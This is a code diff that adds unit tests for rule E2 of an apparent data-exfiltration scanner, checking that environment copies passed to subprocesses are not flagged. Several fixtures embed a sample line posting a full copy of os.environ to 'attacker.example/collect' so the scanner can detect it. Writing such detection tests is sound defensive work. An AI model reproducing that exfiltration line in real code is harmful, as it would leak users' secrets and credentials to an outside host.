@@ -411,6 +411,104 @@ class TestRunStaticPatternsDataExfiltration:
         e2 = [f for f in findings if f.rule_id == "E2"]
         assert len(e2) >= 1
 
+    def test_e2_subprocess_env_dict_unpack_not_flagged(self):
+        """``env={**os.environ, ...}`` handed to a child process is not harvesting."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport subprocess\n"
+                    'subprocess.run(["git", "status"], env={**os.environ, "GIT_OPTIONAL_LOCKS": "0"})'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert not [f for f in findings if f.rule_id == "E2"]
+
+    def test_e2_subprocess_env_copy_via_variable_not_flagged(self):
+        """``env = os.environ.copy()`` passed to a child process is not harvesting."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    'env["GIT_OPTIONAL_LOCKS"] = "0"\n'
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert not [f for f in findings if f.rule_id == "E2"]
+
+    def test_e2_environ_copy_not_reaching_subprocess_still_flagged(self):
+        """An environ copy bound to a name and sent elsewhere still fires."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport requests\n"
+                    "env = os.environ.copy()\n"
+                    'requests.post("https://attacker.example/collect", json=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert [f for f in findings if f.rule_id == "E2"]
+
+    def test_e2_environ_copy_rebound_before_subprocess_still_flagged(self):
+        """A later ``env = {}`` handed to a child process does not vouch for an earlier copy."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport requests\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    'requests.post("https://attacker.example/collect", json=env)\n'
+                    "env = {}\n"
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        e2 = [f for f in findings if f.rule_id == "E2"]
+        assert [f.start_line for f in e2] == [4]
+
+    def test_e2_environ_copy_exfiltrated_and_passed_through_still_flagged(self):
+        """A copy that is both sent over the network and handed to a child process fires."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport requests\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    'requests.post("https://attacker.example/collect", json=env)\n'
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        e2 = [f for f in findings if f.rule_id == "E2"]
+        assert [f.start_line for f in e2] == [4]
+
+    def test_e2_environ_copy_edited_in_place_before_subprocess_not_flagged(self):
+        """In-place edits of the mapping keep it on the pass-through path."""
+        state = {
+            "components": ["script.py"],
+            "file_cache": {
+                "script.py": (
+                    "import os\nimport subprocess\n"
+                    "env = os.environ.copy()\n"
+                    'env.update({"GIT_OPTIONAL_LOCKS": "0"})\n'
+                    'env.pop("GIT_DIR", None)\n'
+                    'del env["GIT_WORK_TREE"]\n'
+                    'subprocess.run(["git", "status"], env=env)'
+                ),
+            },
+        }
+        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+        assert not [f for f in findings if f.rule_id == "E2"]
+
     def test_e5_boto3_put_object_produces_finding(self):
         """boto3 put_object yields E5, MEDIUM severity."""
         state = {
